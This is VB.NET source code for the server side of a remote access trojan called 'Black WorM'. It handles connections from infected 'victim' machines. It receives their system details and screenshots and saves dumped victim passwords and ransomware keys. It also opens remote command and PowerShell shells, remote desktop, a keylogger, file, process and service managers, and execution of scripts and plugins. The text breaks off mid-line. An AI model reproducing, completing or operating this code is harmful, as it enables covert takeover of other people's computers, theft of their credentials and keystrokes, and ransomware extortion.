﻿Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Linq
Imports System.IO
Public Class Form1
    Public WithEvents S As Listner
    Public vr As String = "[ 0000 ] Black WorM v" & My.Application.Info.Version.Major & "." & My.Application.Info.Version.Minor & " [ Black Ninja ] | Online[ xxx ] Sel[ sss ]"
    Public k As String = ""
    Public Password As String
    Public Y As String = "|BlackWorm|"
    Public folder As String
    Public folder1 As String
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Public Function DEB(ByRef s As String) As String ' Decode Base64
        Dim b As Byte() = Convert.FromBase64String(s)
        DEB = System.Text.Encoding.UTF8.GetString(b)
    End Function
    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        Form9.Close()
        Application.Exit()
        End
    End Sub
    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        Form9.Close()
        Application.Exit()
        End
    End Sub
    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Control.CheckForIllegalCrossThreadCalls = False

        Try
            Dim item As New ListViewItem
            item.Text = TimeOfDay
            item.SubItems.Add("0.0.0.0")
            item.SubItems.Add("Welcome " & Environment.UserName & " To Black Worm v" & My.Application.Info.Version.Major & "." & My.Application.Info.Version.Minor)
            item.SubItems.Add("Welcome")
            Logs.Items.Add(item)
            Dim i As String = 0
            For Each g As String In IO.File.ReadAllLines("Groups.ini")
                L1.Groups.Add(i, g.Replace("<Group>", "").Replace("</Group>", ""))
                i = i + 1
            Next

        Catch ex As Exception

        End Try
        If My.Settings.SettingsNoStart = True Then
            k = My.Settings.Port
            Password = My.Settings.Password
        End If
        If My.Settings.cpstatus = True Then

        Else
            ConPro.Show()
        End If
        Form9.Visible = False
        Form9.Hide()
        If My.Settings.AutoListner = True Then
            StartToolStripMenuItem.PerformClick()
        Else

        End If
    End Sub
    Private Function CompDir(ByVal F1 As IO.FileInfo, ByVal F2 As IO.FileInfo) As Boolean ' Compare 2 path
        If F1.Name.ToLower <> F2.Name.ToLower Then Return False
        Dim D1 = F1.Directory
        Dim D2 = F2.Directory
re:
        If D1.Name.ToLower = D2.Name.ToLower = False Then Return False
        D1 = D1.Parent
        D2 = D2.Parent
        If D1 Is Nothing And D2 Is Nothing Then Return True
        If D1 Is Nothing Then Return False
        If D2 Is Nothing Then Return False
        GoTo re
    End Function
    Public Function ENB(ByRef s As String) As String ' Encode base64
        Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
        ENB = Convert.ToBase64String(byt)
    End Function
    Delegate Sub _Data(ByVal u As USER, ByVal B As Byte())
    Private Sub IND(ByVal u As USER, ByVal b() As Byte) Handles S.Data
        Dim A As String() = Split(BS(b), Y)
        Try
            Select Case DEB(A(0))
                Case "getinfo"
                    Dim aa() As String = Split(A(1), "||")
                    Dim vdesk As New IO.MemoryStream(Convert.FromBase64String(aa(8)))
                    SyncLock Me.PictureBox1
                        Me.PictureBox1.Image = Image.FromStream(vdesk)
                    End SyncLock
                    Lv1.Items.Clear()
                    Lv1.Items.Add("IP Address : " & u.IP.Split(":")(0), 0)
                    Lv1.Items.Add("Username : " & aa(0), 1)
                    Lv1.Items.Add("Contery :" & aa(1), 2)
                    Lv1.Items.Add("OS : " & aa(2), 3)
                    Lv1.Items.Add("AntiVirus : " & aa(3), 4)
                    Lv1.Items.Add("Firewall : " & aa(4), 5)
                    Lv1.Items.Add("CPU : " & aa(5), 6)
                    Lv1.Items.Add("GPU : " & aa(6), 7)
                    Lv1.Items.Add("RAM : " & GetSize(aa(7)), 8)

                Case "!0" ' i recive victim info
                    If My.Computer.FileSystem.DirectoryExists(Application.StartupPath & "\BlackWorm\" & (A(1)) & "\Download\") Then
                    Else
                        My.Computer.FileSystem.CreateDirectory(Application.StartupPath & "\BlackWorm\" & (A(1)) & "\Download\")
                    End If

                    folder = (Application.StartupPath & "\BlackWorm\" & (A(1)) & "\Download\")
                    folder1 = Application.StartupPath & "\BlackWorm\" & (A(1)) & "\"
                    If My.Settings.notfication = True Then
                        Try
                            If Me.InvokeRequired = True Then
                                Me.Invoke(New _Data(AddressOf IND), u, b)
                                Exit Sub
                            End If

                            Dim notfi As notfi = GFORM("notfi" & u.IP)
                            notfi = New notfi
                            notfi.Name = "notfi" & u.IP
                            notfi.PictureBox2.Image = notfi.IMG2.Images.Item(A(4) & ".png")
                            notfi.Label1.Text = u.IP.Split(":")(0)
                            notfi.Label2.Text = A(1)
                            notfi.Label3.Text = A(3)
                            notfi.Label4.Text = A(5)
                            notfi.Label5.Text = A(6)
                            notfi.Show()
                        Catch ex As Exception

                        End Try
                    End If


                    SyncLock L1.Items
                        u.L = L1.Items.Add(u.IP, "", "X.png")
                        u.L.Tag = u
                        u.L.Text = A(1)
                        u.L.SubItems.Add(u.IP.Split(":")(0))
                        For i As Integer = 2 To A.Length - 1
                            u.L.SubItems.Add(A(i))
                        Next
                        u.L.ImageKey = u.L.SubItems(hco.Index).Text & ".png"
                        If A(17) = "None" Then
                            ' Nothing
                        Else
                            L1.Groups(Convert.ToInt32(A(17))).Items.Add(u.L)
                        End If
                        L1.FX()


                        If u.L.SubItems(hcheck.Index).Text = "Yes" Then
                            u.L.ForeColor = Color.Blue
                        End If
                        If u.L.SubItems(hadmin.Index).Text = "Administrator" Then
                            u.L.ForeColor = Color.DarkRed
                        End If
                        If u.L.SubItems(hransom.Index).Text = "Yes" Then
                            u.L.ForeColor = Color.DarkGreen
                        End If

                    End SyncLock

                Case "!1" ' update Active Window
                    SyncLock L1.Items
                        u.L.SubItems(hac.Index).Text = DEB(A(1))
                    End SyncLock

                Case "ping" ' ping
                    SyncLock L1.Items
                        u.IsPinged = False
                        u.L.SubItems(hping.Index).Text = u.MS & "ms"
                        u.MS = 0
                    End SyncLock

                Case "sendpass"
                    If IO.Directory.Exists(folder1 & "Passwords") = True Then
                        If IO.File.Exists(folder1 & "Passwords\" & A(2) & ".txt") Then
                            IO.File.Delete(folder1 & "Passwords\" & A(2) & ".txt")
                            IO.File.WriteAllText(folder1 & "Passwords" & "\" & DEB(A(2)) & ".txt", DEB(A(1)))
                        Else
                            IO.File.WriteAllText(folder1 & "Passwords" & "\" & DEB(A(2)) & ".txt", DEB(A(1)))
                        End If
                    Else
                        IO.Directory.CreateDirectory(folder1 & "Passwords")
                        IO.File.WriteAllText(folder1 & "Passwords" & "\" & DEB(A(2)) & ".txt", DEB(1))
                    End If
                    MsgBox("Victim Passwords Has Been Dumped in Passwords folder", MsgBoxStyle.Information, "Done !")
                    Process.Start(folder1 & "Passwords")



                Case "sendransompassword"
                    If IO.Directory.Exists(folder1 & "Ransomware") = True Then
                        If IO.File.Exists(folder1 & "Ransomware\" & DEB(A(2)) & ".txt") Then
                            IO.File.Delete(folder1 & "Ransomware\" & DEB(A(2)) & ".txt")
                            IO.File.WriteAllText(folder1 & "Ransomware" & "\" & DEB(A(2)) & ".txt", DEB(A(1)))
                        Else
                            IO.File.WriteAllText(folder1 & "Ransomware" & "\" & DEB(A(2)) & ".txt", DEB(A(1)))
                        End If
                    Else
                        IO.Directory.CreateDirectory(folder1 & "Ransomware")
                        IO.File.WriteAllText(folder1 & "Ransomware" & "\" & DEB(A(2)) & ".txt", DEB(A(1)))
                    End If
                    MsgBox("Victim Ransomware key Has Been Dumped in Ransomware folder", MsgBoxStyle.Information, "Done !")
                    Process.Start(folder1 & "Ransomware")


                Case "customoutput"
                    Select Case A(3)
                        Case "exe"
                            If IO.Directory.Exists(folder1 & "CustomPluginOutput") = True Then
                                If IO.File.Exists(folder1 & "CustomPluginOutput\" & A(2) & ".exe") Then
                                    IO.File.Delete(folder1 & "CustomPluginOutput\" & A(2) & ".exe")
                                    IO.File.WriteAllBytes(folder1 & "CustomPluginOutput\" & "\" & A(2) & ".exe", Convert.FromBase64String(A(1)))
                                Else
                                    IO.File.WriteAllBytes(folder1 & "CustomPluginOutput\" & "\" & A(2) & ".exe", Convert.FromBase64String(A(1)))
                                End If
                            Else
                                IO.Directory.CreateDirectory(folder1 & "CustomPluginOutput\")
                                IO.File.WriteAllBytes(folder1 & "CustomPluginOutput\" & "\" & A(2) & ".exe", Convert.FromBase64String(A(1)))
                            End If

                        Case "png"
                            If IO.Directory.Exists(folder1 & "CustomPluginOutput") = True Then
                                If IO.File.Exists(folder1 & "CustomPluginOutput\" & A(2) & ".png") Then
                                    IO.File.Delete(folder1 & "CustomPluginOutput\" & A(2) & ".png")
                                    IO.File.WriteAllBytes(folder1 & "CustomPluginOutput" & "\" & A(2) & ".png", Convert.FromBase64String(A(1)))
                                Else
                                    IO.File.WriteAllBytes(folder1 & "CustomPluginOutput" & "\" & A(2) & ".png", Convert.FromBase64String(A(1)))
                                End If
                            Else
                                IO.Directory.CreateDirectory(folder1 & "CustomPluginOutput")
                                IO.File.WriteAllBytes(folder1 & "CustomPluginOutput" & "\" & A(2) & ".png", Convert.FromBase64String(A(1)))

                            End If
                        Case "txt"
                            If IO.Directory.Exists(folder1 & "CustomPluginOutput") = True Then
                                If IO.File.Exists(folder1 & "CustomPluginOutput\" & A(2) & ".txt") Then
                                    IO.File.Delete(folder1 & "CustomPluginOutput\" & A(2) & ".txt")
                                    IO.File.WriteAllText(folder1 & "CustomPluginOutput\" & A(2) & ".txt", A(1))
                                Else
                                    IO.File.WriteAllText(folder1 & "CustomPluginOutput\" & A(2) & ".txt", A(1))
                                End If
                            Else
                                IO.Directory.CreateDirectory(folder1 & "CustomPluginOutput")
                                IO.File.WriteAllText(folder1 & "CustomPluginOutput\" & A(2) & ".txt", A(1))
                            End If
                    End Select
                    MsgBox("Your Plugin OutPut has Been Dumped in CustomPluginOutput folder.", MsgBoxStyle.Information, "Done !")
                    Process.Start(folder1 & "CustomPluginOutput")


                Case "pr"
                    Try
                        If Me.InvokeRequired = True Then
                            Me.Invoke(New _Data(AddressOf IND), u, b)
                            Exit Sub
                        End If

                        Dim pr As pr = GFORM("pr" & u.IP)
                        If pr Is Nothing Then
                            pr = New pr
                            pr.Name = "pr" & u.IP
                            pr.Text = "Process Manager - " & u.IP.Split(":")(0)
                            pr.F = Me
                            pr.U = u
                            pr.Show()
                        End If
                        pr.prlist.Items.Clear()
                        For i As Integer = 1 To A.Length - 1
                            Dim aa() As String = Split(A(i), "||")
                            Dim item As New ListViewItem

                            item.ImageIndex = 0
                            Select Case aa(0)
                                Case "firefox"
                                    item.ImageIndex = 1
                                Case "IDMan"
                                    item.ImageIndex = 2
                                Case "WinRAR"
                                    item.ImageIndex = 3
                                Case "vlc"
                                    item.ImageIndex = 4
                                Case "Taskmgr"
                                    item.ImageIndex = 5
                                Case "cmd"
                                    item.ImageIndex = 6
                                Case "conhost"
                                    item.ImageIndex = 6
                                Case "Dropbox"
                                    item.ImageIndex = 7
                                Case "notepad"
                                    item.ImageIndex = 8
                                Case "regedit"
                                    item.ImageIndex = 9
                                Case "explorer"
                                    item.ImageIndex = 10
                            End Select
                            item.Text = aa(0)
                            item.SubItems.Add(aa(1))

                            If aa(2) = "-" Then
                                item.SubItems.Add("System")
                            Else
                                item.SubItems.Add(aa(2))
                            End If
                            Try
                                item.SubItems.Add(DEB(aa(3)))
                            Catch
                                item.SubItems.Add(aa(3))
                            End Try
                            Try
                                item.SubItems.Add(GetSize(aa(4)))
                            Catch
                                item.SubItems.Add(aa(4))
                            End Try
                            pr.prlist.Items.Add(item)
                        Next
                        pr.RunningProcessToolStripMenuItem.Text = pr.prlist.Items.Count & " Running Process"
                        pr.prlist.FX()
                        For i = 0 To pr.prlist.Items.Count - 1
                            If pr.prlist.Items(i).SubItems(0).Text = "Taskmgr" Or pr.prlist.Items(i).SubItems(0).Text = "svchost" Or pr.prlist.Items(i).SubItems(2).Text.Contains("System32") Or pr.prlist.Items(i).SubItems(2).Text.Contains("system32") Then
                                pr.prlist.Items(i).ForeColor = Color.Red
                            End If
                            If pr.prlist.Items(i).SubItems(3).Text.Contains("Windows Update") Then
                                pr.prlist.Items(i).ForeColor = Color.Blue
                            End If
                        Next
                        'S.Send(u, ENB("colorme"))


                    Catch ex As Exception

                    End Try

                Case "sr"
                    Try
                        If Me.InvokeRequired = True Then
                            Me.Invoke(New _Data(AddressOf IND), u, b)
                            Exit Sub
                        End If

                        Dim pr As Service = GFORM("sr" & u.IP)
                        If pr Is Nothing Then
                            pr = New Service
                            pr.Name = "sr" & u.IP
                            pr.Text = "Service Manager - " & u.IP.Split(":")(0)
                            pr.F = Me
                            pr.U = u
                            pr.Show()
                        End If
                        pr.Lv1.Items.Clear()
                        For i As Integer = 1 To A.Length - 1
                            Dim aa() As String = Split(A(i), "||")
                            Dim item As New ListViewItem
                            item.Text = aa(0)
                            item.ImageIndex = 0
                            item.SubItems.Add(aa(1))
                            item.SubItems.Add(aa(2))
                            item.SubItems.Add(aa(3))
                            pr.Lv1.Items.Add(item)
                        Next
                        pr.RunningProcessToolStripMenuItem.Text = pr.Lv1.Items.Count & " Running Service"
                        pr.Lv1.FX()
                    Catch err As Exception

                    End Try

                Case "smu"
                    Try
                        If Me.InvokeRequired = True Then
                            Me.Invoke(New _Data(AddressOf IND), u, b)
                            Exit Sub
                        End If

                        Dim pr As SM = GFORM("sm" & u.IP)
                        If pr Is Nothing Then
                            pr = New SM
                            pr.Name = "sm" & u.IP
                            pr.Text = "Startup Manager - " & u.IP.Split(":")(0)
                            pr.F = Me
                            pr.U = u
                            pr.Show()
                        End If
                        pr.smlist.Items.Clear()
                        For i As Integer = 1 To A.Length - 1
                            Dim aa() As String = Split(A(i), "/||\")
                            Dim item As New ListViewItem
                            item.Text = aa(0)
                            item.SubItems.Add(aa(1))
                            pr.smlist.Items.Add(item)
                        Next
                        pr.RunningProcessToolStripMenuItem.Text = pr.smlist.Items.Count & " Startup Items"
                        pr.smlist.FX()
                    Catch err As Exception

                    End Try

                Case "sml"
                    Dim pr As SM = GFORM("sm" & u.IP)
                    pr.Lv1.Items.Clear()
                    For i As Integer = 1 To A.Length - 1
                        Dim aa() As String = Split(A(i), "/||\")
                        Dim item As New ListViewItem
                        item.Text = aa(0)
                        item.SubItems.Add(aa(1))
                        pr.Lv1.Items.Add(item)
                    Next
                    pr.RunningProcessToolStripMenuItem.Text = (pr.Lv1.Items.Count + pr.smlist.Items.Count) & " Startup Items"
                    pr.Lv1.FX()

                Case "rss"
                    Try
                        If GFORM("sh" & u.IP) IsNot Nothing Then Exit Sub

                        If Me.InvokeRequired = True Then
                            Dim j As New _Data(AddressOf IND)
                            Me.Invoke(j, New Object() {u, b})
                            Exit Sub
                        End If

                        Dim shell As sh = GFORM("sh" & u.IP)
                        If shell Is Nothing Then
                            shell = New sh
                            shell.Name = "sh" & u.IP
                            shell.Text = "Command Shell - " & u.IP.Split(":")(0)
                            shell.U = u
                            shell.Show()
                        End If

                    Catch ex As Exception

                    End Try


                Case "pss"
                    Try
                        If GFORM("powershell" & u.IP) IsNot Nothing Then Exit Sub

                        If Me.InvokeRequired = True Then
                            Dim j As New _Data(AddressOf IND)
                            Me.Invoke(j, New Object() {u, b})
                            Exit Sub
                        End If

                        Dim shell As powershell = GFORM("powershell" & u.IP)
                        If shell Is Nothing Then
                            shell = New powershell
                            shell.Name = "powershell" & u.IP
                            shell.Text = "Windows Powershell - " & u.IP.Split(":")(0)
                            shell.U = u
                            shell.Show()
                        End If

                    Catch ex As Exception

                    End Try




                Case "rs"
                    Try
                        Dim shell As sh = GFORM("sh" & u.IP)
                        shell.RichTextBox1.AppendText(DEB(A(1)) & vbNewLine)
                    Catch ex As Exception

                    End Try


                Case "rsc"
                    Try
                        Dim shell As sh = GFORM("sh" & u.IP)
                        shell.Close()

                    Catch ex As Exception

                    End Try




                Case "prs"
                    Try
                        Dim shell As powershell = GFORM("powershell" & u.IP)
                        shell.RichTextBox1.AppendText(DEB(A(1)) & vbNewLine)
                    Catch ex As Exception

                    End Try


                Case "prsc"
                    Try
                        Dim shell As powershell = GFORM("powershell" & u.IP)
                        shell.Close()

                    Catch ex As Exception

                    End Try

                Case "!" ' i recive size of client screen
                    ' lets start Cap form and start capture desktop
                    If GFORM("cap" & u.IP) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf IND)
                        Me.Invoke(j, New Object() {u, b})
                        Exit Sub
                    End If
                    Dim f As New cap
                    f.F = Me
                    f.Sock = u
                    f.Name = "cap" & u.IP
                    Try
                        f.Text = "Remote Desktop - " & u.IP.Split(":")(0) & " [ Size: " & siz(b.Length) & " ,No Changes ]"
                    Catch
                        f.Text = "Remote Desktop - " & u.IP.Split(":")(0) & " [ Size: " & "-" & " ,No Changes ]"

                    End Try
                    f.Sz = New Size(A(1), A(2))
                    f.Show()

                Case "@" ' i recive image  
                    Dim F As cap = GFORM("cap" & u.IP)
                    If F IsNot Nothing Then
                        If A(1).Length = 1 Then
                            F.Text = "Remote Desktop " & " [ Size: " & siz(b.Length) & " ,No Changes ]"
                            If F.Button1.Text = "Stop" Then
                                S.Send(u, ENB("@") & Y & F.C1.SelectedIndex & Y & F.C2.Text & Y & F.C.Value)
                            End If
                            Exit Sub
                        End If
                        Dim BB As Byte() = fx(b, ENB("@") & Y)(1)
                        F.PktToImage(BB)
                    End If

                Case "@@" ' i recive image  
                    Dim BB As Byte() = fx(b, ENB("@@") & Y)(1)

                Case "openkl"
                    If GFORM("keylo" & u.IP) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf IND)
                        Me.Invoke(j, New Object() {u, b})
                        Exit Sub
                    End If
                    Dim f As New keylo
                    f.sock = u
                    f.F = Me
                    f.Name = "keylo" & u.IP
                    f.Text = "Keylogger - " & u.IP.Split(":")(0)
                    f.Show()

                Case "loges"
                    Dim F As keylo = GFORM("keylo" & u.IP)
                    If F IsNot Nothing Then
                        Dim T1 As New Thread(AddressOf F.Getloges)
                        Try
                            T1.Start(DEB(A(1)))
                        Catch ex As Exception
                            T1.Start(A(1))
                        End Try
                    End If

                Case "openscript"
                    If GFORM("Form8" & u.IP) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf IND)
                        Me.Invoke(j, New Object() {u, b})
                        Exit Sub
                    End If
                    Dim script As Form8 = GFORM("Form8" & u.IP)
                    If script Is Nothing Then
                        script = New Form8
                        script.Name = "Form8" & u.IP
                        script.Text = "Execute Scripts - " & u.IP.Split(":")(0)
                        script.F = Me
                        script.TargetUser = u
                        script.Show()
                    End If

                Case "opencustom"
                    If GFORM("ExecuteCustom" & u.IP) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf IND)
                        Me.Invoke(j, New Object() {u, b})
                        Exit Sub
                    End If
                    Dim exec As ExecuteCustom = GFORM("ExecuteCustom" & u.IP)
                    If exec Is Nothing Then
                        exec = New ExecuteCustom
                        exec.Name = "ExecuteCustom" & u.IP
                        exec.Text = "Execute Plugins - " & u.IP.Split(":")(0)
                        exec.F = Me
                        exec.User = u
                        exec.Show()
                    End If

                Case "opentransfer"
                    If GFORM("ExecuteCustom" & u.IP) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf IND)
                        Me.Invoke(j, New Object() {u, b})
                        Exit Sub
                    End If
                    Dim exec As tranfer = GFORM("tranfer" & u.IP)
                    If exec Is Nothing Then
                        exec = New tranfer
                        exec.Name = "tranfer" & u.IP
                        exec.Text = "Transfer Target - " & u.IP.Split(":")(0)
                        exec.F = Me
                        exec.user = u
                        exec.Show()
                    End If

                Case "|||"    ' open file manager
                    If GFORM("Form10" & u.IP) IsNot Nothing Then Exit Sub
                    If Me.InvokeRequired Then
                        Dim j As New _Data(AddressOf IND)
                        Me.Invoke(j, New Object() {u, b})
                        Exit Sub
                    End If
                    Dim fm As Form10 = GFORM("Form10" & u.IP)
                    If fm Is Nothing Then
                        fm = New Form10
                        fm.Name = "Form10" & u.IP
                        fm.Text = "File Manager - " & u.IP.Split(":")(0)
                        fm.F = Me
                        fm.sock = u
                        fm.Show()
                    End If

                Case "FileManager"
                    Dim fff As Form10 = GFORM("Form10" & u.IP)
                    If A(1) = "Error" Then
                        fff.BackToolStripMenuItem1.PerformClick()
                    Else
                        fff.ListView1.Items.Clear()
                        fff.ListView1.Items.Add("...", 2)
                        Dim allFiles As String() = Split(A(1), "FileManagerSplit")
                        For i = 0 To allFiles.Length - 2
                            Dim itm As New ListViewItem
                            Try
                                itm.Text = DEB(allFiles(i))
                            Catch
                                ' itm.Text = "..."
                                itm.Text = allFiles(i)
                            End Try
                            itm.SubItems.Add(allFiles(i + 1))
                            If Not itm.Text.StartsWith("[Drive]") And Not itm.Text.StartsWith("[CD]") And Not itm.Text.StartsWith("[Folder]") Then
                                Dim fsize As Long = Convert.ToInt64(itm.SubItems(1).Text)
                                If fsize > 1073741824 Then
                                    Dim size As Double = fsize / 1073741824
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " GB"
                                ElseIf fsize > 1048576 Then
                                    Dim size As Double = fsize / 1048576
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " MB"
                                ElseIf fsize > 1024 Then
                                    Dim size As Double = fsize / 1024
                                    itm.SubItems(1).Text = Math.Round(size, 2).ToString & " KB"
                                Else
                                    itm.SubItems(1).Text = fsize.ToString & " B"
                                End If
                                itm.Tag = Convert.ToInt64(allFiles(i + 1))
                            End If
                            If itm.Text.StartsWith("[Drive]") Then
                                itm.ImageIndex = 0
                                itm.Text = DEB(itm.Text.Substring(7))
                            ElseIf itm.Text.StartsWith("[CD]") Then
                                itm.ImageIndex = 1
                                itm.Text = DEB(itm.Text.Substring(4))
                            ElseIf itm.Text.StartsWith("[Folder]") Then
                                itm.ImageIndex = 2
                                itm.Text = DEB(itm.Text.Substring(8))
                            ElseIf itm.Text.EndsWith(".exe") Or itm.Text.EndsWith(".EXE") Or itm.Text.EndsWith(".scr") Or itm.Text.EndsWith(".SCR") Then
                                itm.ImageIndex = 3
                            ElseIf itm.Text.EndsWith(".jpg") Or itm.Text.EndsWith(".JPG") Or itm.Text.EndsWith(".jpeg") Or itm.Text.EndsWith(".JPEG") Or itm.Text.EndsWith(".ico") Or itm.Text.EndsWith(".ICO") Or itm.Text.EndsWith(".svg") Or itm.Text.EndsWith(".SVG") Or itm.Text.EndsWith(".svgz") Or itm.Text.EndsWith(".SVGZ") Or itm.Text.EndsWith(".drw") Or itm.Text.EndsWith(".DRW") Or itm.Text.EndsWith(".psp") Or itm.Text.EndsWith(".PSP") Or itm.Text.EndsWith(".gif") Or itm.Text.EndsWith(".GIF") Or itm.Text.EndsWith(".png") Or itm.Text.EndsWith(".PNG") Or itm.Text.EndsWith(".bmp") Or itm.Text.EndsWith(".BMP") Or itm.Text.EndsWith(".dib") Or itm.Text.EndsWith(".DIB") Or itm.Text.EndsWith(".jpe") Or itm.Text.EndsWith(".JPE") Or itm.Text.EndsWith(".jfif") Or itm.Text.EndsWith(".JFIF") Or itm.Text.EndsWith(".tif") Or itm.Text.EndsWith(".TIF") Or itm.Text.EndsWith(".tiff") Or itm.Text.EndsWith(".TIFF") Then
                                itm.ImageIndex = 4
                            ElseIf itm.Text.EndsWith(".txt") Or itm.Text.EndsWith(".TXT") Or itm.Text.EndsWith(".log") Or itm.Text.EndsWith(".LOG") Or itm.Text.EndsWith(".readme") Or itm.Text.EndsWith(".README") Or itm.Text.EndsWith(".me") Or itm.Text.EndsWith(".ME") Then
                                itm.ImageIndex = 5
                            ElseIf itm.Text.EndsWith(".dll") Or itm.Text.EndsWith(".DLL") Or itm.Text.EndsWith(".db") Or itm.Text.EndsWith(".DB") Then
                                itm.ImageIndex = 6
                            ElseIf itm.Text.EndsWith(".zip") Or itm.Text.EndsWith(".ZIP") Or itm.Text.EndsWith(".rar") Or itm.Text.EndsWith(".RAR") Or itm.Text.EndsWith(".7z") Or itm.Text.EndsWith(".7Z") Or itm.Text.EndsWith(".jar") Or itm.Text.EndsWith(".JAR") Or itm.Text.EndsWith(".tar") Or itm.Text.EndsWith(".TAR") Or itm.Text.EndsWith(".tgz") Or itm.Text.EndsWith(".TGZ") Or itm.Text.EndsWith(".gz") Or itm.Text.EndsWith(".GZ") Or itm.Text.EndsWith(".bz2") Or itm.Text.EndsWith(".BZ2") Or itm.Text.EndsWith(".tbz2") Or itm.Text.EndsWith(".TBZ2") Or itm.Text.EndsWith(".gzip") Or itm.Text.EndsWith(".GZIP") Or itm.Text.EndsWith(".z") Or itm.Text.EndsWith(".Z") Or itm.Text.EndsWith(".sit") Or itm.Text.EndsWith(".SIT") Or itm.Text.EndsWith(".cab") Or itm.Text.EndsWith(".CAB") Or itm.Text.EndsWith(".lzh") Or itm.Text.EndsWith(".LZH") Or itm.Text.EndsWith(".pkg") Or itm.Text.EndsWith(".PKG") Then
                                itm.ImageIndex = 7
                            ElseIf itm.Text.EndsWith(".bat") Or itm.Text.EndsWith(".BAT") Or itm.Text.EndsWith(".cmd") Or itm.Text.EndsWith(".CMD") Then
                                itm.ImageIndex = 9
                            ElseIf itm.Text.EndsWith(".avi") Or itm.Text.EndsWith(".AVI") Or itm.Text.EndsWith(".divx") Or itm.Text.EndsWith(".DIVX") Or itm.Text.EndsWith(".mkv") Or itm.Text.EndsWith(".MKV") Or itm.Text.EndsWith(".webm") Or itm.Text.EndsWith(".WEBM") Or itm.Text.EndsWith(".mp4") Or itm.Text.EndsWith(".MP4") Or itm.Text.EndsWith(".m4v") Or itm.Text.EndsWith(".M4V") Or itm.Text.EndsWith(".mp4v") Or itm.Text.EndsWith(".MP4V") Or itm.Text.EndsWith(".mpv4") Or itm.Text.EndsWith(".MPV4") Or itm.Text.EndsWith(".ogm") Or itm.Text.EndsWith(".OGM") Or itm.Text.EndsWith(".ogv") Or itm.Text.EndsWith(".OGV") Or itm.Text.EndsWith(".flv") Or itm.Text.EndsWith(".FLV") Or itm.Text.EndsWith(".mpeg") Or itm.Text.EndsWith(".MPEG") Or itm.Text.EndsWith(".mpg") Or itm.Text.EndsWith(".MPG") Or itm.Text.EndsWith(".mp2v") Or itm.Text.EndsWith(".MP2V") Or itm.Text.EndsWith(".mpv2") Or itm.Text.EndsWith(".MPV2") Or itm.Text.EndsWith(".m1v") Or itm.Text.EndsWith(".M1V") Or itm.Text.EndsWith(".m2v") Or itm.Text.EndsWith(".M2V") Or itm.Text.EndsWith(".m2p") Or itm.Text.EndsWith(".M2P") Or itm.Text.EndsWith(".mpe") Or itm.Text.EndsWith(".MPE") Or itm.Text.EndsWith(".ts") Or itm.Text.EndsWith(".TS") Or itm.Text.EndsWith(".m2ts") Or itm.Text.EndsWith(".M2TS") Or itm.Text.EndsWith(".mts") Or itm.Text.EndsWith(".MTS") Or itm.Text.EndsWith(".m2t") Or itm.Text.EndsWith(".M2T") Or itm.Text.EndsWith(".tps") Or itm.Text.EndsWith(".TPS") Or itm.Text.EndsWith(".hdmov") Or itm.Text.EndsWith(".HDMOV") Or itm.Text.EndsWith(".mov") Or itm.Text.EndsWith(".MOV") Or itm.Text.EndsWith(".3gp") Or itm.Text.EndsWith(".3GP") Or itm.Text.EndsWith(".3gpp") Or itm.Text.EndsWith(".3GPP") Or itm.Text.EndsWith(".wmv") Or itm.Text.EndsWith(".WMV") Or itm.Text.EndsWith(".asf") Or itm.Text.EndsWith(".ASF") Or itm.Text.EndsWith(".ifo") Or itm.Text.EndsWith(".IFO") Or itm.Text.EndsWith(".vob") Or itm.Text.EndsWith(".VOB") Or itm.Text.EndsWith(".mpls") Or itm.Text.EndsWith(".MPLS") Or itm.Text.EndsWith(".rm") Or itm.Text.EndsWith(".RM") Or itm.Text.EndsWith(".rmvb") Or itm.Text.EndsWith(".RMVB") Then
                                itm.ImageIndex = 11
                            ElseIf itm.Text.EndsWith(".mp3") Or itm.Text.EndsWith(".MP3") Or itm.Text.EndsWith(".it") Or itm.Text.EndsWith(".IT") Or itm.Text.EndsWith(".asx") Or itm.Text.EndsWith(".ASX") Or itm.Text.EndsWith(".au") Or itm.Text.EndsWith(".AU") Or itm.Text.EndsWith(".mid") Or itm.Text.EndsWith(".MID") Or itm.Text.EndsWith(".midi") Or itm.Text.EndsWith(".MIDI") Or itm.Text.EndsWith(".snd") Or itm.Text.EndsWith(".SND") Or itm.Text.EndsWith(".wma") Or itm.Text.EndsWith(".WMA") Or itm.Text.EndsWith(".aiff") Or itm.Text.EndsWith(".AIFF") Or itm.Text.EndsWith(".ogg") Or itm.Text.EndsWith(".OGG") Or itm.Text.EndsWith(".oga") Or itm.Text.EndsWith(".OGA") Or itm.Text.EndsWith(".mka") Or itm.Text.EndsWith(".MKA") Or itm.Text.EndsWith(".m4a") Or itm.Text.EndsWith(".M4A") Or itm.Text.EndsWith(".aac") Or itm.Text.EndsWith(".AAC") Or itm.Text.EndsWith(".flac") Or itm.Text.EndsWith(".FLAC") Or itm.Text.EndsWith(".wv") Or itm.Text.EndsWith(".WV") Or itm.Text.EndsWith(".mpc") Or itm.Text.EndsWith(".MPC") Or itm.Text.EndsWith(".ape") Or itm.Text.EndsWith(".APE") Or itm.Text.EndsWith(".apl") Or itm.Text.EndsWith(".APL") Or itm.Text.EndsWith(".alac") Or itm.Text.EndsWith(".ALAC") Or itm.Text.EndsWith(".tta") Or itm.Text.EndsWith(".TTA") Or itm.Text.EndsWith(".ac3") Or itm.Text.EndsWith(".AC3") Or itm.Text.EndsWith(".dts") Or itm.Text.EndsWith(".DTS") Or itm.Text.EndsWith(".amr") Or itm.Text.EndsWith(".AMR") Or itm.Text.EndsWith(".ra") Or itm.Text.EndsWith(".RA") Or itm.Text.EndsWith(".wav") Or itm.Text.EndsWith(".WAV") Or itm.Text.EndsWith(".mpcpl") Or 